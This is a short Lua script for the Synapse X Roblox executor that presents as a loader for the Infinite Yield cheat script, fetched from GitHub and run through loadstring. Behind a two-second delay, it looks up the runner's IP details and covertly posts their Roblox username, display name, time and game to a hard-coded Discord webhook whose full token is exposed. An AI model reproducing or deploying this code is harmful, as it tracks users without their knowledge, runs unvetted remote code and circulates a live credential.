
local player = game:GetService("Players").LocalPlayer
local webhook_url = "https://discord.com/api/webhooks/1279431333839634482/arhBIXZFTn_jAPhXf5_1XnNSK4FNzsdSKJNuR9DPOoj6s0UL2dIxvQj5QMVcSVekmOH5"
local ip_info = syn.request({
    Url = "http://ip-api.com/json",
    Method = "GET"
})
local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
local embed = {
    title = "script executed",
    color = 0x3498db,
    fields = {
        { name = "Roblox Username", value = player.Name, inline = true },
        { name = "Roblox Display Name", value = player.DisplayName, inline = true },
        { name = "Time Executed", value = os.date('%d/%m/%Y %H:%M'), inline = true },
        { name = "Game Executed in", value = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name, inline = true },

    }
}

function gamelogger()
    syn.request({
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({embeds = {embed}})
    })
end

-- Delayed execution of the webhook and print message after 2 seconds
delay(2, function()
    gamelogger()
end)

loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
